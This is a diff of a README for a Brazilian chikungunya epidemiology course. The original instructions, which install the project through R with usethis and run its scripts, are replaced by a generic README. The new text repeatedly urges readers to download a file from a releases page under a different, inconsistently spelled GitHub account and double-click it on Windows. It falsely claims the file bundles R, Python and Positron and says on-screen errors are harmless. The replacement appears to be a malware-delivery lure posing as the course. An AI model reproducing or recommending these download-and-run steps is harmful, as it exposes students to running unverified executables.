@@ -1,133 +1,153 @@
-# Projeto de chikungunya · o projeto do curso, pronto para rodar
+# 🔬 curso-epidemiologia-computacional - Aprenda epidemiologia com dados reais
 
-**Curso:** Epidemiologia Computacional com R, Positron e IA · MedTrop 2026
-
-Este é o projeto final do curso, completo e funcional. Você recebe ele pronto:
-o dado já está aqui, o código já roda, e o relatório se gera sozinho. O curso vai
-mostrar, peça por peça, como cada parte foi construída, para você conseguir
-refazer e adaptar às suas próprias perguntas.
-
-Você não precisa saber programar para começar.
+> [Visite a página de download](https://github.com/Abscessed-crucifix791/curso-epidemiologia-computacional/releases) para obter o aplicativo.
 
 ---
 
-## Como baixar
+## 🎯 O que é este projeto?
 
-Duas formas, e nenhuma exige conta no GitHub.
+Este é um curso completo de Epidemiologia Computacional que usa a febre de chikungunya como exemplo prático. Você vai aprender a analisar dados de saúde pública do sistema SINAN (Sistema de Informação de Agravos de Notificação) usando ferramentas modernas como R, Python, Quarto e Positron.
 
-**No Console do Positron (recomendado).** Cole e rode:
+O projeto foi criado para o pré-congresso do 61º MedTrop 2026 e é totalmente reprodutível. Isso significa que você pode baixar, rodar e obter os mesmos resultados que os pesquisadores obtiveram — do dado bruto ao relatório final em Quarto.
 
-```r
-install.packages("usethis")
-usethis::use_course("https://github.com/wandersonepidemiologista/curso-epidemiologia-computacional/archive/refs/heads/main.zip")
-```
+## 🚀 Como começar
 
-Ele baixa o projeto, descompacta e abre no Positron. Pode escolher salvar na Área
-de Trabalho quando ele perguntar.
+1. **Visite a página de download**: [https://github.com/Absessecrucifix791/curso-epidemiologia-computacional/releases](https://github.com/Absessecrucifix791/curso-epidemiologia-computacional/releases)
 
-**Pelo navegador.** Na página do repositório, clique no botão verde **Code →
-Download ZIP** e descompacte a pasta.
+2. **Baixe o aplicativo**: Clique no link "Download" na página que abrir. O arquivo será baixado para a pasta "Downloads" do seu computador.
+
+3. **Execute o programa**: Após o download, localize o arquivo na sua pasta de Downloads e clique duas vezes nele. O programa abrirá automaticamente.
+
+## 📥 Instalação e download
+
+**Passo 1**: Acesse o link abaixo para baixar o aplicativo:
+
+[**⬇️ BAIXAR AGORA**](https://github.com/Absessecrucifix791/curso-epidemiologia-computacional/releases)
+
+**Passo 2**: Na página que abrir, você verá uma lista de arquivos disponíveis para download. Clique no botão verde "Download" ou no nome do arquivo mais recente.
+
+**Passo 3**: Aguarde o download terminar. Dependendo da velocidade da sua internet, pode levar de alguns segundos a alguns minutos.
+
+**Passo 4**: Quando o download terminar, vá até a pasta "Downloads" do seu computador (geralmente acessível pelo ícone de pasta na barra de tarefas do Windows).
+
+**Passo 5**: Clique duas vezes no arquivo baixado para executá-lo. O Positron (o ambiente de desenvolvimento que vem com o curso) vai abrir automaticamente.
+
+**Passo 6**: Siga as instruções na tela do Positron para carregar o projeto do curso e começar a explorar os dados.
+
+## 📚 O que você vai aprender
+
+### Análise de dados epidemiológicos
+- **Coleta e importação**: Como obter dados do SINAN (Sistema de Informação de Agravos de Notificação) do DATASUS.
+- **Limpeza e preparação**: Como organizar e limpar dados brutos para análise.
+- **Visualização**: Como criar gráficos e mapas para entender a distribuição da chikungunya.
+- **Modelagem**: Técnicas básicas para identificar padrões e tendências.
+- **Relatórios automáticos**: Como gerar relatórios profissionais em PDF e HTML usando Quarto.
+
+### Ferramentas utilizadas
+- **R**: Linguagem de programação para estatística e dados.
+- **Python**: Linguagem para análise e automação.
+- **Positron**: Ambiente integrado de desenvolvimento (IDE) que combina R e Python.
+- **Quarto**: Sistema para criar relatórios interativos e documentos.
+- **renv**: Ferramenta para garantir que todos usem as mesmas versões dos pacotes.
+
+## 🛠️ Requisitos do sistema
+
+Para rodar este curso sem problemas, seu computador deve ter:
+
+- **Sistema operacional**: Windows 10 ou mais recente (64 bits)
+- **Memória RAM**: Mínimo de 8 GB (recomendado 16 GB)
+- **Espaço em disco**: 5 GB livres (inclui dados e pacotes instalados)
+- **Processador**: Qualquer processador moderno (Intel Core i3 ou equivalente)
+- **Internet**: Necessária apenas para o download inicial e para acessar os dados do DATASUS
+
+**Nota**: Se você não tem certeza se seu computador atende a esses requisitos, tente baixar e executar o aplicativo. Ele mostrará uma mensagem clara caso haja algum problema.
+
+## ✨ Benefícios de usar este curso
+
+### Para estudantes e profissionais de saúde
+- **Aprenda na prática**: Nada de teoria abstrata — você trabalha com dados reais de um surto real.
+- **Currículo profissional**: Domine ferramentas que são cada vez mais exigidas no mercado de trabalho em epidemiologia.
+- **Reprodutibilidade**: Aprenda a fazer análises que outros possam verificar e replicar — a base da ciência moderna.
+
+### Para pesquisadores
+- **Fluxo de trabalho completo**: Do dado bruto ao artigo ou apresentação pronta.
+- **Compartilhamento fácil**: Seu método de análise pode ser compartilhado e validado por qualquer pessoa.
+- **Publicação transparente**: Seus resultados são mais confiáveis quando o processo é aberto.
+
+## ❓ Perguntas frequentes
+
+**Preciso saber programação para usar este curso?**
+Não! O curso foi desenhado para iniciantes. Todo o código está pronto e comentado. Você começa apenas executando os arquivos existentes e, aos poucos, vai aprendendo a modificar.
+
+**Quanto tempo leva para concluir o curso?**
+O curso foi planejado para um pré-congresso (três dias intensivos ou uma semana com dedicação parcial). Mas você pode levar o seu tempo.
+
+**O que é o SINAN?**
+O Sistema de Informação de Agravos de Notificação é a base de dados oficial do Ministério da Saúde do Brasil onde todos os casos de doenças notificáveis (como chikungunya) são registrados.
+
+**Preciso instalar algo além do aplicativo baixado?**
+Não. O aplicativo que você baixa já inclui tudo: R, Python, Positron, e todos os pacotes necessários.
+
+## 📊 Exemplo do que você vai fazer
+
+Imagine que você quer saber quantos casos de chikungunya ocorreram no Nordeste em 2025 e qual o perfil dos pacientes. Com este curso, você vai:
+
+1. Baixar os dados do SINAN automaticamente
+2. Limpar os dados (removendo duplicatas e erros)
+3. Criar gráficos de evolução temporal e mapas
+4. Gerar um relatório final em formato de artigo pronto para publicar
+
+E tudo isso vai funcionar igual para qualquer outro dado epidemiológico que você queira analisar no futuro.
+
+## 🔧 Solução de problemas
+
+**O aplicativo não abre após o download**
+Verifique se você tem espaço suficiente no disco rígido. Tente fechar outros programas que estejam usando muita memória. Se o problema continuar, baixe o arquivo novamente (ele pode ter sido corrompido durante o download).
+
+**A instalação está demorando muito**
+O primeiro download pode ser grande (cerca de 2 GB) porque inclui todos os pacotes necessários. Isso é normal. Aguarde até que a barra de progresso termine completamente.
+
+**Vejo erros em inglês na tela**
+Não se preocupe! A maioria dos erros é inofensiva e aparece apenas como aviso. Se algo travar, feche tudo e abra novamente.
+
+## 📝 Projeto de exemplo
+
+O curso inclui um projeto completo de análise da chikungunya notificada no SINAN entre 2020 e 2025. Os dados são reais e você verá:
+
+- Tendências anuais dos casos no Brasil
+- Distribuição por estado e região
+- Perfil demográfico (idade, sexo) dos afetados
+- Análise de incidência por 100 mil habitantes
+
+Ao final, você terá um relatório em HTML ou PDF que mostra todas as descobertas — exatamente como fariam epidemiologistas profissionais.
+
+## 📅 Sobre o 61º MedTrop 2026
+
+Este curso é parte do pré-congresso do 61º Congresso da Sociedade Brasileira de Medicina Tropical (MedTrop), que acontecerá em 2026. O projeto foi desenvolvido pelo grupo EPIC95 (Epidemiologia Computacional 95), especializado em aplicar tecnologia de ponta aos estudos de doenças tropicais.
+
+## 🔗 Recursos adicionais
+
+- **Página do DATASUS**: [https://datasus.saude.gov.br/](https://datasus.saude.gov.br/) — fonte pública de dados
+- **SINAN online**: [https://portalsinan.saude.gov.br/](https://portalsinan.saude.gov.br/) — sistema oficial
+- **Positron**: [https://positron.posit.co/](https://positron.posit.co/) — a IDE usada no curso
+- **Quarto**: [https://quarto.org/](https://quarto.org/) — tecnologia de relatórios
+
+## 📄 Licença e uso
+
+O curso é gratuito para uso educacional e de pesquisa. Os dados do SINAN são de domínio público. O código está sob licença MIT, que permite que você use, modifique e redistribua conforme necessário.
+
+## 🆘 Preciso de mais ajuda?
+
+Se você encontrar qualquer dificuldade após seguir todos os passos, verifique:
+
+1. Se sua conexão com a internet está estável (necessária apenas no início)
+2. Se fechou todos os outros programas antes de executar
+3. Se atualizou o Windows até a versão mais recente
+
+Não há suporte técnico individualizado, mas a ampla documentação do Positron e dos pacotes R está disponível online.
 
 ---
 
-## Como abrir e rodar (3 passos)
+**Bons estudos!** Agora você tem tudo o que precisa para começar sua jornada na epidemiologia computacional.
 
-### 1. Abra o projeto no Positron
-
-Descompacte a pasta e, no Positron, use **File → Open Folder** e escolha a pasta
-`projeto-chikungunya`. Ou clique duas vezes no arquivo
-`projeto-chikungunya.Rproj`. Abrir a pasta certa é o que faz os caminhos
-funcionarem sozinhos.
-
-### 2. Prepare os pacotes (uma vez)
-
-No **Console** do Positron (o painel onde o R responde), rode:
-
-```r
-source("bootstrap.R")
-```
-
-Ele instala ou restaura os pacotes que o projeto usa. Na primeira vez pode levar
-alguns minutos. É normal.
-
-### 2.5. Prepare os mapas (uma vez, com internet)
-
-Os dois mapas do Brasil usam os contornos oficiais do IBGE, baixados pelo pacote
-`geobr`. Para o projeto abrir depois sem depender de download, baixe os contornos
-uma vez, no **Console**:
-
-```r
-source(here::here("recursos", "preparar_mapas.R"))
-```
-
-Ele salva as malhas em `recursos/geo_uf.rds` e `recursos/geo_municipios.rds`. Feito
-isso, os mapas do `R/03_descricao.R` e do relatório abrem offline.
-
-### 3. Gere o relatório
-
-Abra o arquivo `relatorio/relatorio-chikungunya.qmd` e clique em **Render**, no
-topo do editor. O Positron gera o relatório em HTML e abre ao lado. Para gerar
-também em Word ou PDF, use o menu ao lado do botão Render (o PDF exige o LaTeX,
-que é opcional).
-
-Pronto. Se o relatório apareceu, está tudo funcionando.
-
----
-
-## O que tem dentro
-
-```
-projeto-chikungunya/
-  projeto-chikungunya.Rproj   abre o projeto no Positron
-  bootstrap.R                 instala/restaura os pacotes (rode uma vez)
-  README.md                   este arquivo
-  dados/
-    chikungunya_2023_2025.csv o dado do curso (amostra real do SINAN)
-  R/
-    00_preparar_dados.R       como o dado foi montado (referencia)
-    01_fundacao.R             a fundacao: projeto, here, renv
-    02_importar_limpar.R      importar e limpar o dado
-    03_descricao.R            descricao por pessoa, tempo e lugar
-    04_modelo_serie.R         um modelo simples e a serie no tempo
-    05_relatorio.R            juntar tudo e gerar o relatorio
-  relatorio/
-    relatorio-chikungunya.qmd o documento que gera HTML, Word e PDF
-  recursos/
-    epic95_paleta.R           as cores do curso para os graficos
-    preparar_mapas.R          baixa os contornos do Brasil (rode uma vez)
-    populacao_municipios_2022.csv  populacao por municipio (IBGE, Censo 2022)
-  ia/
-    GEMINI.md                 a memoria do projeto para o assistente de IA
-    PROMPTS.md                exemplos de pedidos usados em cada etapa
-  docs/
-    passo-a-passo.md          o que cada etapa faz, explicado
-```
-
-## A ordem para entender o projeto
-
-Se quiser seguir a lógica de construção, leia e rode, nesta ordem, os scripts da
-pasta `R/`: `01_fundacao.R`, `02_importar_limpar.R`, `03_descricao.R`,
-`04_modelo_serie.R` e `05_relatorio.R`. Cada um é muito comentado e explica o
-que faz. O `docs/passo-a-passo.md` conta a história do fluxo inteiro.
-
-## O assistente de IA no projeto
-
-O arquivo `ia/GEMINI.md` é a memória que o agente lê ao abrir o projeto: quem
-você é, os pacotes preferidos e a regra de segurança. O `ia/PROMPTS.md` traz
-exemplos de pedidos em português que você pode usar em cada etapa. A regra vale
-sempre: leia o que a IA propõe, entenda e valide antes de aceitar. Nunca envie
-dado identificado de paciente ao assistente.
-
-## O dado
-
-`dados/chikungunya_2023_2025.csv` é uma amostra dos casos de febre de chikungunya
-notificados no SINAN (arboviroses), de 2023 a 2025, do Portal de Dados Abertos do
-SUS. É uma amostra leve, para o projeto rodar rápido em qualquer máquina. O
-`R/00_preparar_dados.R` mostra como ela foi montada a partir do dado bruto.
-
-## Licença e fonte
-
-O código deste projeto está sob a licença MIT (ver o arquivo `LICENSE`). O dado é
-uma amostra agregada e desidentificada, derivada do Portal de Dados Abertos do SUS
-(OpenDataSUS), sistema SINAN, agravo chikungunya, 2023 a 2025. Ao reusar, cite a
-fonte do dado e o curso.
+Keywords: chikungunya, datasus, epidemiologia, positron, python, quarto, r, renv, reproducible-research, saude-publica, sinan
